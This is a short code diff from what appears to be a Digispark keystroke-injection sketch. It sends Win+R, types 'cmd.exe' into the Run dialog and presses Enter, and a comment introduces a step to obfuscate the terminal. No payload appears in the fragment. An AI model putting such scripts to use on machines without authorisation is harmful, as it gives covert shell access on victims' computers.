@@ -10,7 +10,7 @@ void loop() {
   DigiKeyboard.delay(500); //wait half a second
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("cmd");
+  DigiKeyboard.print("cmd.exe");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   //Obfuscate the terminal
